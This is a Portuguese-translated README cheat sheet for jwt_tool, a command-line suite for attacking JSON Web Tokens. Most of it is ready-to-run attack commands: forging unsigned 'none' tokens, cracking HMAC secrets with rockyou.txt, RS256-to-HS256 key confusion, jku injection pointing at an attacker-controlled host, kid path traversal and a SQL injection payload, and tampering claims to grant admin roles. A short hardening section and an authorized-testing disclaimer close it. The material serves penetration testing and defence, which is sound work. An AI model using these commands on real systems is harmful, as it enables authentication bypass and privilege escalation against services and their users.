<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🪙 jwt_tool – Folha de dicas completa

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
       ██╗██╗    ██╗████████╗    ████████╗ ██████╗  ██████╗ ██╗     
       ██║██║    ██║╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
       ██║██║ █╗ ██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ██   ██║██║███╗██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ╚█████╔╝╚███╔███╔╝   ██║          ██║   ╚██████╔╝╚██████╔╝███████╗
   ╚════╝  ╚══╝╚══╝    ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
        All-in-One JSON Web Token Manipulation & Exploitation Suite
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/jwt__tool-Token_Exploitation-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Author-ticarpi-orange?style=for-the-badge" alt="ticarpi">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Segurança da Web">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p alinhar="centro">
  <b>🪙 Kit de ferramentas Python CLI poderoso para analisar, adulterar, falsificar, escanear e quebrar JSON Web Tokens (JWT)</b>
</p>

---

## 📋 Índice

- [Visão geral e anatomia JWT] (#-visão geral - jwt-anatomy)
- [Instalação](#-instalação)
- [Análise e inspeção de token](#-token-parsing--inspection)
- [Verificação automatizada de vulnerabilidades (`-M at`)](#-automated-vulnerability-scanning--m-at)
- [Cenários de exploração comuns](#-cenários de exploração comuns)
  - [Confusão de algoritmo/Nenhum ataque (`none`)](#algoritmo-confusão--none-attack-none)
  - [Quebra de chave secreta HMAC](#hmac-secret-key-cracking)
  - [Confusão de chaves: RS256 a HS256 com chave pública](#key-confusion-rs256-to-hs256-with-public-key)
  - [Injeção de cabeçalho: JKU, X5U e JWK Spoofing](#header-injection-jku-x5u--jwk-spoofing)
  - [Injeção KID (SQLi e Path Traversal)](#kid-injection-sqli--path-traversal)
- [Reivindicações de adulteração e falsificação de carga](#-adulteração de carga--reivindicações de falsificação)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Considerações Defensivas e Endurecimento](#-considerações defensivas--endurecimento)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)

---

## 🎯 Visão geral e anatomia JWT

Um JSON Web Token (RFC 7519) consiste em três segmentos codificados em Base64URL separados por pontos (`.`):
`header.payload.signature`

1. **Cabeçalho:** Identifica o tipo de token (`typ`) e o algoritmo de assinatura (`alg`, por exemplo, `HS256`, `RS256`, `none`).
2. **Carga útil:** Contém declarações do usuário (`sub`, `role`, `admin`, `exp`).
3. **Assinatura:** Hash de verificação criptográfica que evita adulterações do lado do cliente.

Criado por **ticarpi**, **jwt_tool** automatiza testes para falhas de arquitetura e implementação em fluxos de trabalho de autenticação JWT em APIs e aplicativos web modernos.

---

## 📥 Instalação
```bash
# Clone the repository
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool

# Install dependencies
pip install -r requirements.txt

# Run jwt_tool
python3 jwt_tool.py --help
```
---

## 🔍 Análise e inspeção de token

Decodifique e inspecione parâmetros de cabeçalho e declarações de carga útil:
```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.signature
```
---

## ⚡ Verificação automatizada de vulnerabilidades (`-M at`)

Inicie verificações automatizadas do playbook testando vulnerabilidades conhecidas em um serviço da web de destino:
```bash
# Run All Tests (-M at) sending requests to web endpoint
python3 jwt_tool.py <JWT_TOKEN> \
  -M at \
  -u "https://api.target.com/user/profile" \
  -rh "Authorization: Bearer <JWT_TOKEN>"
```
*Testes realizados:*
- Remoção de assinatura (nenhuma variante de algoritmo)
- Confusão de chave RSA para HMAC
- Adulteração de reivindicação (`admin=true`, escalonamento de privilégios)
- Injeção em cabeçalhos `kid`, `jku`, `x5u`
- Tratamento de assinatura vazia

---

## 💥 Cenários comuns de exploração

### Confusão de algoritmo/Nenhum ataque (`none`)
Quando as implementações de back-end aceitam tokens não assinados:
```bash
# Forge token with 'none' algorithm and stripped signature
python3 jwt_tool.py <JWT_TOKEN> -X a
```
*Variantes testadas automaticamente:* `none`, `None`, `NONE`, `nOnE`.

### Quebra de chave secreta HMAC
Quando HS256/HS384/HS512 usa uma senha fraca:
```bash
# Dictionary attack using rockyou.txt
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```
### Confusão de chaves: RS256 a HS256 com chave pública
Se o servidor assinar com RSA (RS256), mas aceitar HMAC (HS256) usando seu certificado público como chave HMAC compartilhada:
```bash
# Forge token using server public key file
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem
```
### Injeção de cabeçalho: falsificação de JKU, X5U e JWK
Injetando chaves ou URLs controlados pelo invasor:
```bash
# Inject attacker-controlled JWKS URL in jku header
python3 jwt_tool.py <JWT_TOKEN> -I -hc jku -hv "https://attacker.com/jwks.json" -S hs256 -k secret
```
### Injeção KID (SQLi e Path Traversal)
Se o back-end usar o parâmetro de cabeçalho `kid` (Key ID) diretamente em consultas de banco de dados ou caminhos de arquivo:
```bash
# Path traversal pointing to /dev/null (empty secret)
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""

# SQL Injection in kid header to bypass signature verification
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "key1' UNION SELECT 'my_secret'--" -S hs256 -p "my_secret"
```
---

## ✍️ Reivindicações de adulteração e falsificação de carga útil

Modifique valores de declaração específicos e renuncie ao token:
```bash
# Change claim 'admin' to true and 'role' to 'SuperAdmin' using known secret
python3 jwt_tool.py <JWT_TOKEN> \
  -T \
  -pc "admin" -pv "true" \
  -pc "role" -pv "SuperAdmin" \
  -k "secret_key"
```
---

## ⚡ Tabela de referência rápida

| Objetivo | Comando |
|-----------|---------|
| **Decodificar e analisar token** | `python3 jwt_tool.py <JWT>` |
| **Digitalização completa do manual** | `python3 jwt_tool.py <JWT> -M at -u <URL> -rh "Auth: Bearer <JWT>"` |
| **Decifrar o segredo do HMAC** | `python3 jwt_tool.py <JWT> -C -d rockyou.txt` |
| **Algoritmo Ignorar sem Nenhum** | `python3 jwt_tool.py <JWT> -X a` |
| **RS256 -> Confusão HS256** | `python3 jwt_tool.py <JWT> -X k -pk public.pem` |
| **Tamper carga útil e sinal** | `python3 jwt_tool.py <JWT> -T -pc admin -pv true -k <KEY>` |
| **Travessia do caminho KID** | `python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""` |

---

## 🛡️ Considerações defensivas e endurecimento

1. **Lista de permissões de algoritmo estrita:** Nunca aceite `none` ou troca de algoritmo. Verifique explicitamente os algoritmos esperados (somente `RS256`).
2. **Rejeite chaves controladas pelo cliente:** Não confie cegamente nos cabeçalhos `jku`, `jwk` ou `x5u` de entradas não confiáveis ​​sem listas de permissões de domínio estritas.
3. **Use segredos fortes:** Certifique-se de que as chaves HMAC tenham pelo menos 256 bits de bytes aleatórios criptográficos de alta entropia.

---

## ⚠️ Isenção de responsabilidade legal

> [!CUIDADO]
> jwt_tool foi projetado estritamente para testes de penetração autorizados, avaliações de vulnerabilidade de API e pesquisas educacionais. Forjar tokens para acessar sistemas não autorizados sem permissão por escrito é estritamente ilegal.